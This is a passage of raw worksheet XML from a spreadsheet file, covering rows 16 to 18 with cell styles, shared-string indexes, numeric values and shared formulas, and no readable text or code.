      <c r="CO16" s="319">
        <v>0</v>
      </c>
      <c r="CP16" s="319">
        <v>0</v>
      </c>
      <c r="CQ16" s="319">
        <v>0</v>
      </c>
      <c r="CR16" s="319">
        <v>0</v>
      </c>
      <c r="CS16" s="320">
        <v>0</v>
      </c>
      <c r="CT16" s="339">
        <v>0</v>
      </c>
      <c r="CU16" s="340">
        <v>0</v>
      </c>
      <c r="CV16" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW16" s="340">
        <v>0</v>
      </c>
      <c r="CX16" s="340"/>
      <c r="CY16" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ16" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA16" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB16" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC16" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD16" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE16" s="340">
        <v>0</v>
      </c>
      <c r="DF16" s="341">
        <v>0</v>
      </c>
      <c r="DG16" s="341">
        <v>0</v>
      </c>
      <c r="DH16" s="341">
        <v>0</v>
      </c>
      <c r="DI16" s="341">
        <v>0</v>
      </c>
      <c r="DJ16" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK16" s="341">
        <v>0</v>
      </c>
      <c r="DL16" s="341">
        <v>0</v>
      </c>
      <c r="DM16" s="341">
        <v>0</v>
      </c>
      <c r="DN16" s="341">
        <v>0</v>
      </c>
      <c r="DO16" s="341">
        <v>0</v>
      </c>
      <c r="DP16" s="342">
        <v>0</v>
      </c>
      <c r="DQ16" s="355">
        <v>0</v>
      </c>
      <c r="DR16" s="356">
        <v>0</v>
      </c>
      <c r="DS16" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DT16" s="356">
        <v>0</v>
      </c>
      <c r="DU16" s="356"/>
      <c r="DV16" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DW16" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX16" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DY16" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ16" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA16" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB16" s="356">
        <v>0</v>
      </c>
      <c r="EC16" s="357">
        <v>0</v>
      </c>
      <c r="ED16" s="357">
        <v>0</v>
      </c>
      <c r="EE16" s="357">
        <v>0</v>
      </c>
      <c r="EF16" s="357">
        <v>0</v>
      </c>
      <c r="EG16" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH16" s="357">
        <v>0</v>
      </c>
      <c r="EI16" s="357">
        <v>0</v>
      </c>
      <c r="EJ16" s="357">
        <v>0</v>
      </c>
      <c r="EK16" s="357">
        <v>0</v>
      </c>
      <c r="EL16" s="357">
        <v>0</v>
      </c>
      <c r="EM16" s="358">
        <v>0</v>
      </c>
      <c r="EN16" s="368" t="str">
        <f t="shared" si="1"/>
        <v>NO</v>
      </c>
      <c r="EO16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP16" s="369"/>
      <c r="EQ16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES16" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV16" s="369"/>
      <c r="EW16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX16" s="369"/>
      <c r="EY16" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA16" s="369"/>
      <c r="FB16" s="369"/>
      <c r="FC16" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FD16" s="369">
        <f t="shared" si="2"/>
        <v>0</v>
      </c>
      <c r="FE16" s="369">
        <v>0</v>
      </c>
      <c r="FF16" s="369">
        <v>0</v>
      </c>
      <c r="FG16" s="369">
        <v>0</v>
      </c>
      <c r="FH16" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI16" s="377" t="str">
        <f t="shared" si="3"/>
        <v>NO</v>
      </c>
      <c r="FJ16" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK16" s="378"/>
      <c r="FL16" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM16" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN16" s="378"/>
      <c r="FO16" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP16" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ16" s="378"/>
      <c r="FR16" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS16" s="380"/>
      <c r="FT16" s="380"/>
      <c r="FU16" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV16" s="378"/>
      <c r="FW16" s="378"/>
      <c r="FX16" s="378">
        <v>0</v>
      </c>
      <c r="FY16" s="378">
        <f t="shared" si="4"/>
        <v>0</v>
      </c>
      <c r="FZ16" s="378">
        <v>0</v>
      </c>
      <c r="GA16" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB16" s="378">
        <v>0</v>
      </c>
      <c r="GC16" s="379" t="s">
        <v>12</v>
      </c>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c r="IW16" s="40"/>
      <c r="IX16" s="40"/>
      <c r="IY16" s="40"/>
      <c r="IZ16" s="40"/>
      <c r="JA16" s="40"/>
      <c r="JB16" s="40"/>
      <c r="JC16" s="40"/>
      <c r="JD16" s="40"/>
      <c r="JE16" s="40"/>
      <c r="JF16" s="40"/>
      <c r="JG16" s="40"/>
      <c r="JH16" s="40"/>
      <c r="JI16" s="40"/>
      <c r="JJ16" s="40"/>
      <c r="JK16" s="40"/>
      <c r="JL16" s="40"/>
      <c r="JM16" s="40"/>
      <c r="JN16" s="40"/>
      <c r="JO16" s="40"/>
      <c r="JP16" s="40"/>
      <c r="JQ16" s="40"/>
      <c r="JR16" s="40"/>
      <c r="JS16" s="40"/>
      <c r="JT16" s="40"/>
      <c r="JU16" s="40"/>
      <c r="JV16" s="40"/>
      <c r="JW16" s="40"/>
      <c r="JX16" s="40"/>
      <c r="JY16" s="40"/>
      <c r="JZ16" s="40"/>
      <c r="KA16" s="40"/>
      <c r="KB16" s="40"/>
      <c r="KC16" s="40"/>
      <c r="KD16" s="40"/>
      <c r="KE16" s="40"/>
      <c r="KF16" s="40"/>
      <c r="KG16" s="40"/>
      <c r="KH16" s="40"/>
      <c r="KI16" s="40"/>
      <c r="KJ16" s="40"/>
      <c r="KK16" s="40"/>
      <c r="KL16" s="40"/>
      <c r="KM16" s="40"/>
      <c r="KN16" s="40"/>
      <c r="KO16" s="40"/>
      <c r="KP16" s="40"/>
      <c r="KQ16" s="40"/>
      <c r="KR16" s="40"/>
      <c r="KS16" s="40"/>
      <c r="KT16" s="40"/>
      <c r="KU16" s="40"/>
      <c r="KV16" s="40"/>
      <c r="KW16" s="40"/>
      <c r="KX16" s="40"/>
      <c r="KY16" s="40"/>
      <c r="KZ16" s="40"/>
      <c r="LA16" s="40"/>
      <c r="LB16" s="40"/>
      <c r="LC16" s="40"/>
      <c r="LD16" s="40"/>
      <c r="LE16" s="40"/>
      <c r="LF16" s="40"/>
      <c r="LG16" s="40"/>
      <c r="LH16" s="40"/>
      <c r="LI16" s="40"/>
    </row>
    <row r="17" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B17" s="224" t="s">
        <v>211</v>
      </c>
      <c r="C17" s="225" t="s">
        <v>273</v>
      </c>
      <c r="D17" s="225" t="s">
        <v>212</v>
      </c>
      <c r="E17" s="225" t="s">
        <v>392</v>
      </c>
      <c r="F17" s="225"/>
      <c r="G17" s="225" t="s">
        <v>393</v>
      </c>
      <c r="H17" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I17" s="225"/>
      <c r="J17" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K17" s="227" t="s">
        <v>413</v>
      </c>
      <c r="L17" s="228" t="s">
        <v>397</v>
      </c>
      <c r="M17" s="227" t="s">
        <v>395</v>
      </c>
      <c r="N17" s="227" t="s">
        <v>414</v>
      </c>
      <c r="O17" s="389"/>
      <c r="P17" s="275" t="s">
        <v>186</v>
      </c>
      <c r="Q17" s="225" t="s">
        <v>186</v>
      </c>
      <c r="R17" s="225"/>
      <c r="S17" s="396"/>
      <c r="T17" s="280" t="s">
        <v>402</v>
      </c>
      <c r="U17" s="230" t="s">
        <v>405</v>
      </c>
      <c r="V17" s="231" t="s">
        <v>2578</v>
      </c>
      <c r="W17" s="231"/>
      <c r="X17" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y17" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z17" s="256" t="s">
        <v>398</v>
      </c>
      <c r="AA17" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB17" s="256" t="s">
        <v>2529</v>
      </c>
      <c r="AC17" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD17" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE17" s="259" t="s">
        <v>418</v>
      </c>
      <c r="AF17" s="270" t="s">
        <v>415</v>
      </c>
      <c r="AG17" s="225" t="s">
        <v>416</v>
      </c>
      <c r="AH17" s="271" t="s">
        <v>417</v>
      </c>
      <c r="AI17" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ17" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK17" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL17" s="229" t="s">
        <v>403</v>
      </c>
      <c r="AM17" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN17" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO17" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP17" s="230"/>
      <c r="AQ17" s="230"/>
      <c r="AR17" s="288">
        <v>1</v>
      </c>
      <c r="AS17" s="288">
        <v>1</v>
      </c>
      <c r="AT17" s="288">
        <v>0</v>
      </c>
      <c r="AU17" s="288">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="AV17" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW17" s="288">
        <v>1</v>
      </c>
      <c r="AX17" s="288">
        <v>1</v>
      </c>
      <c r="AY17" s="288">
        <v>0</v>
      </c>
      <c r="AZ17" s="288">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="BA17" s="289"/>
      <c r="BB17" s="301">
        <v>0</v>
      </c>
      <c r="BC17" s="302">
        <v>0</v>
      </c>
      <c r="BD17" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE17" s="302">
        <v>0</v>
      </c>
      <c r="BF17" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG17" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH17" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI17" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ17" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK17" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL17" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM17" s="302">
        <v>0</v>
      </c>
      <c r="BN17" s="304">
        <v>0</v>
      </c>
      <c r="BO17" s="304">
        <v>0</v>
      </c>
      <c r="BP17" s="304">
        <v>0</v>
      </c>
      <c r="BQ17" s="304">
        <v>0</v>
      </c>
      <c r="BR17" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS17" s="304">
        <v>0</v>
      </c>
      <c r="BT17" s="304">
        <v>0</v>
      </c>
      <c r="BU17" s="304">
        <v>0</v>
      </c>
      <c r="BV17" s="305">
        <v>0</v>
      </c>
      <c r="BW17" s="317">
        <v>0</v>
      </c>
      <c r="BX17" s="318">
        <v>0</v>
      </c>
      <c r="BY17" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ17" s="318">
        <v>0</v>
      </c>
      <c r="CA17" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB17" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC17" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD17" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE17" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF17" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG17" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH17" s="318">
        <v>0</v>
      </c>
      <c r="CI17" s="319">
        <v>0</v>
      </c>
      <c r="CJ17" s="319">
        <v>0</v>
      </c>
      <c r="CK17" s="319">
        <v>0</v>
      </c>
      <c r="CL17" s="319">
        <v>0</v>
      </c>
      <c r="CM17" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN17" s="319">
        <v>0</v>
      </c>
      <c r="CO17" s="319">
        <v>0</v>
      </c>
      <c r="CP17" s="319">
        <v>0</v>
      </c>
      <c r="CQ17" s="319">
        <v>0</v>
      </c>
      <c r="CR17" s="319">
        <v>0</v>
      </c>
      <c r="CS17" s="320">
        <v>0</v>
      </c>
      <c r="CT17" s="339">
        <v>0</v>
      </c>
      <c r="CU17" s="340">
        <v>0</v>
      </c>
      <c r="CV17" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW17" s="340">
        <v>0</v>
      </c>
      <c r="CX17" s="340"/>
      <c r="CY17" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ17" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA17" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB17" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC17" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD17" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE17" s="340">
        <v>0</v>
      </c>
      <c r="DF17" s="341">
        <v>0</v>
      </c>
      <c r="DG17" s="341">
        <v>0</v>
      </c>
      <c r="DH17" s="341">
        <v>0</v>
      </c>
      <c r="DI17" s="341">
        <v>0</v>
      </c>
      <c r="DJ17" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK17" s="341">
        <v>0</v>
      </c>
      <c r="DL17" s="341">
        <v>0</v>
      </c>
      <c r="DM17" s="341">
        <v>0</v>
      </c>
      <c r="DN17" s="341">
        <v>0</v>
      </c>
      <c r="DO17" s="341">
        <v>0</v>
      </c>
      <c r="DP17" s="342">
        <v>0</v>
      </c>
      <c r="DQ17" s="355">
        <v>0</v>
      </c>
      <c r="DR17" s="356">
        <v>0</v>
      </c>
      <c r="DS17" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DT17" s="356">
        <v>0</v>
      </c>
      <c r="DU17" s="356"/>
      <c r="DV17" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DW17" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX17" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DY17" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ17" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA17" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB17" s="356">
        <v>0</v>
      </c>
      <c r="EC17" s="357">
        <v>0</v>
      </c>
      <c r="ED17" s="357">
        <v>0</v>
      </c>
      <c r="EE17" s="357">
        <v>0</v>
      </c>
      <c r="EF17" s="357">
        <v>0</v>
      </c>
      <c r="EG17" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH17" s="357">
        <v>0</v>
      </c>
      <c r="EI17" s="357">
        <v>0</v>
      </c>
      <c r="EJ17" s="357">
        <v>0</v>
      </c>
      <c r="EK17" s="357">
        <v>0</v>
      </c>
      <c r="EL17" s="357">
        <v>0</v>
      </c>
      <c r="EM17" s="358">
        <v>0</v>
      </c>
      <c r="EN17" s="368" t="str">
        <f t="shared" si="1"/>
        <v>NO</v>
      </c>
      <c r="EO17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP17" s="369"/>
      <c r="EQ17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES17" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV17" s="369"/>
      <c r="EW17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX17" s="369"/>
      <c r="EY17" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA17" s="369"/>
      <c r="FB17" s="369"/>
      <c r="FC17" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FD17" s="369">
        <f t="shared" si="2"/>
        <v>0</v>
      </c>
      <c r="FE17" s="369">
        <v>0</v>
      </c>
      <c r="FF17" s="369">
        <v>0</v>
      </c>
      <c r="FG17" s="369">
        <v>0</v>
      </c>
      <c r="FH17" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI17" s="377" t="str">
        <f t="shared" si="3"/>
        <v>NO</v>
      </c>
      <c r="FJ17" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK17" s="378"/>
      <c r="FL17" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM17" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN17" s="378"/>
      <c r="FO17" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP17" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ17" s="378"/>
      <c r="FR17" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS17" s="380"/>
      <c r="FT17" s="380"/>
      <c r="FU17" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV17" s="378"/>
      <c r="FW17" s="378"/>
      <c r="FX17" s="378">
        <v>0</v>
      </c>
      <c r="FY17" s="378">
        <f t="shared" si="4"/>
        <v>0</v>
      </c>
      <c r="FZ17" s="378">
        <v>0</v>
      </c>
      <c r="GA17" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB17" s="378">
        <v>0</v>
      </c>
      <c r="GC17" s="379" t="s">
        <v>12</v>
      </c>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c r="IW17" s="40"/>
      <c r="IX17" s="40"/>
      <c r="IY17" s="40"/>
      <c r="IZ17" s="40"/>
      <c r="JA17" s="40"/>
      <c r="JB17" s="40"/>
      <c r="JC17" s="40"/>
      <c r="JD17" s="40"/>
      <c r="JE17" s="40"/>
      <c r="JF17" s="40"/>
      <c r="JG17" s="40"/>
      <c r="JH17" s="40"/>
      <c r="JI17" s="40"/>
      <c r="JJ17" s="40"/>
      <c r="JK17" s="40"/>
      <c r="JL17" s="40"/>
      <c r="JM17" s="40"/>
      <c r="JN17" s="40"/>
      <c r="JO17" s="40"/>
      <c r="JP17" s="40"/>
      <c r="JQ17" s="40"/>
      <c r="JR17" s="40"/>
      <c r="JS17" s="40"/>
      <c r="JT17" s="40"/>
      <c r="JU17" s="40"/>
      <c r="JV17" s="40"/>
      <c r="JW17" s="40"/>
      <c r="JX17" s="40"/>
      <c r="JY17" s="40"/>
      <c r="JZ17" s="40"/>
      <c r="KA17" s="40"/>
      <c r="KB17" s="40"/>
      <c r="KC17" s="40"/>
      <c r="KD17" s="40"/>
      <c r="KE17" s="40"/>
      <c r="KF17" s="40"/>
      <c r="KG17" s="40"/>
      <c r="KH17" s="40"/>
      <c r="KI17" s="40"/>
      <c r="KJ17" s="40"/>
      <c r="KK17" s="40"/>
      <c r="KL17" s="40"/>
      <c r="KM17" s="40"/>
      <c r="KN17" s="40"/>
      <c r="KO17" s="40"/>
      <c r="KP17" s="40"/>
      <c r="KQ17" s="40"/>
      <c r="KR17" s="40"/>
      <c r="KS17" s="40"/>
      <c r="KT17" s="40"/>
      <c r="KU17" s="40"/>
      <c r="KV17" s="40"/>
      <c r="KW17" s="40"/>
      <c r="KX17" s="40"/>
      <c r="KY17" s="40"/>
      <c r="KZ17" s="40"/>
      <c r="LA17" s="40"/>
      <c r="LB17" s="40"/>
      <c r="LC17" s="40"/>
      <c r="LD17" s="40"/>
      <c r="LE17" s="40"/>
      <c r="LF17" s="40"/>
      <c r="LG17" s="40"/>
      <c r="LH17" s="40"/>
      <c r="LI17" s="40"/>
    </row>
    <row r="18" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B18" s="224" t="s">
        <v>211</v>
      </c>
      <c r="C18" s="225" t="s">
        <v>273</v>
      </c>
      <c r="D18" s="225" t="s">
        <v>212</v>
      </c>
      <c r="E18" s="225" t="s">
        <v>392</v>
      </c>
      <c r="F18" s="225"/>
      <c r="G18" s="225" t="s">
        <v>393</v>
      </c>
      <c r="H18" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I18" s="225"/>
      <c r="J18" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K18" s="227" t="s">
        <v>419</v>
      </c>
      <c r="L18" s="228" t="s">
        <v>421</v>
      </c>
      <c r="M18" s="227" t="s">
        <v>395</v>
      </c>
      <c r="N18" s="227" t="s">
        <v>420</v>
      </c>
      <c r="O18" s="389"/>
      <c r="P18" s="275" t="s">
        <v>186</v>
      </c>
      <c r="Q18" s="225" t="s">
        <v>186</v>
      </c>
      <c r="R18" s="225"/>
      <c r="S18" s="396"/>
      <c r="T18" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U18" s="230" t="s">
        <v>428</v>
      </c>
      <c r="V18" s="231" t="s">
        <v>2577</v>
      </c>
      <c r="W18" s="231"/>
      <c r="X18" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y18" s="255" t="s">
        <v>422</v>
      </c>
      <c r="Z18" s="256" t="s">
        <v>423</v>
      </c>
      <c r="AA18" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB18" s="256" t="s">
        <v>2535</v>
      </c>
      <c r="AC18" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD18" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE18" s="259" t="s">
        <v>427</v>
      </c>
      <c r="AF18" s="270" t="s">
        <v>424</v>
      </c>
      <c r="AG18" s="225" t="s">
        <v>425</v>
      </c>
      <c r="AH18" s="271" t="s">
        <v>426</v>
      </c>
      <c r="AI18" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ18" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK18" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL18" s="229" t="s">
        <v>403</v>
      </c>
      <c r="AM18" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN18" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO18" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP18" s="230"/>
      <c r="AQ18" s="230"/>
      <c r="AR18" s="288">
        <v>10674</v>
      </c>
      <c r="AS18" s="288">
        <v>10674</v>
      </c>
      <c r="AT18" s="288">
        <v>0</v>
      </c>
      <c r="AU18" s="288">
        <f t="shared" si="5"/>
        <v>10674</v>
      </c>
      <c r="AV18" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW18" s="288">
        <v>10683</v>
      </c>
      <c r="AX18" s="288">
        <v>10683</v>
      </c>
      <c r="AY18" s="288">
        <v>0</v>
      </c>
      <c r="AZ18" s="288">
        <v>10683</v>
      </c>
      <c r="BA18" s="289" t="s">
        <v>432</v>
      </c>
      <c r="BB18" s="301">
        <v>0</v>
      </c>
      <c r="BC18" s="302">
        <v>0</v>
      </c>
      <c r="BD18" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE18" s="302">
        <v>0</v>
      </c>
      <c r="BF18" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG18" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH18" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI18" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ18" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK18" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL18" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM18" s="302">
        <v>0</v>
      </c>
      <c r="BN18" s="304">
        <v>10674</v>
      </c>
      <c r="BO18" s="304">
        <v>0</v>
      </c>
      <c r="BP18" s="304">
        <v>0</v>
      </c>
      <c r="BQ18" s="304">
        <v>0</v>
      </c>
      <c r="BR18" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS18" s="304">
        <v>0</v>
      </c>
      <c r="BT18" s="304">
        <v>0</v>
      </c>
      <c r="BU18" s="304">
        <v>0</v>
      </c>
      <c r="BV18" s="305">
        <v>0</v>
      </c>
      <c r="BW18" s="317">
        <v>1</v>
      </c>
      <c r="BX18" s="318">
        <v>0</v>
      </c>
      <c r="BY18" s="318">
        <v>2013028</v>
      </c>
      <c r="BZ18" s="318">
        <v>1</v>
      </c>
      <c r="CA18" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB18" s="318">
        <v>2013028</v>
      </c>
      <c r="CC18" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD18" s="318">
        <v>2013028</v>
      </c>
      <c r="CE18" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF18" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG18" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH18" s="318">
        <v>0</v>
      </c>
      <c r="CI18" s="319">
        <v>1</v>
      </c>
      <c r="CJ18" s="319">
        <v>1</v>
      </c>
      <c r="CK18" s="319">
        <v>0</v>
      </c>
      <c r="CL18" s="319">
        <v>0</v>
      </c>
      <c r="CM18" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN18" s="319">
        <v>1</v>
      </c>
      <c r="CO18" s="319">
        <v>0</v>
      </c>
      <c r="CP18" s="319">
        <v>0</v>
      </c>
      <c r="CQ18" s="319">
        <v>1</v>
      </c>
      <c r="CR18" s="319">
        <v>1</v>
      </c>
      <c r="CS18" s="320">
        <v>0</v>
      </c>
      <c r="CT18" s="339">
        <v>2</v>
      </c>
      <c r="CU18" s="340">
        <v>0</v>
      </c>
      <c r="CV18" s="340" t="s">
        <v>429</v>
      </c>
      <c r="CW18" s="340">
        <v>2</v>
      </c>
      <c r="CX18" s="340"/>
      <c r="CY18" s="340" t="s">
        <v>429</v>
      </c>
      <c r="CZ18" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA18" s="340" t="s">
        <v>429</v>
      </c>
      <c r="DB18" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC18" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD18" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE18" s="340">
        <v>0</v>
      </c>
      <c r="DF18" s="341">
        <v>10674</v>
      </c>
      <c r="DG18" s="341">
        <v>1</v>
      </c>
      <c r="DH18" s="341">
        <v>0</v>
      </c>
      <c r="DI18" s="341">
        <v>0</v>
      </c>
      <c r="DJ18" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK18" s="341">
        <v>2</v>
      </c>
      <c r="DL18" s="341">
        <v>0</v>
      </c>
      <c r="DM18" s="341">
        <v>1</v>
      </c>
      <c r="DN18" s="341">
        <v>1</v>
      </c>
      <c r="DO18" s="341">
        <v>2</v>
      </c>
      <c r="DP18" s="342">
        <v>0</v>
      </c>
      <c r="DQ18" s="355">
        <v>10822</v>
      </c>
      <c r="DR18" s="356">
        <v>0</v>
      </c>
      <c r="DS18" s="356" t="s">
        <v>430</v>
      </c>
      <c r="DT18" s="356">
        <v>6</v>
      </c>
      <c r="DU18" s="356"/>
      <c r="DV18" s="356" t="s">
        <v>431</v>
      </c>
      <c r="DW18" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX18" s="356" t="s">
        <v>431</v>
      </c>
      <c r="DY18" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ18" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA18" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB18" s="356">
        <v>0</v>
      </c>
      <c r="EC18" s="357">
        <v>1</v>
      </c>
      <c r="ED18" s="357">
        <v>10674</v>
      </c>
      <c r="EE18" s="357">
        <v>0</v>
      </c>
      <c r="EF18" s="357">
        <v>0</v>
      </c>
      <c r="EG18" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH18" s="357">
        <v>9823</v>
      </c>
      <c r="EI18" s="357">
        <v>0</v>
      </c>
      <c r="EJ18" s="357">
        <v>1</v>
      </c>
      <c r="EK18" s="357">
        <v>10821</v>
      </c>
      <c r="EL18" s="357">
        <v>10822</v>
      </c>
      <c r="EM18" s="358">
        <v>0</v>
      </c>
      <c r="EN18" s="368" t="str">
        <f t="shared" si="1"/>
        <v>NO</v>
      </c>
      <c r="EO18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP18" s="369"/>
      <c r="EQ18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES18" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV18" s="369"/>
      <c r="EW18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX18" s="369"/>
      <c r="EY18" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA18" s="369"/>
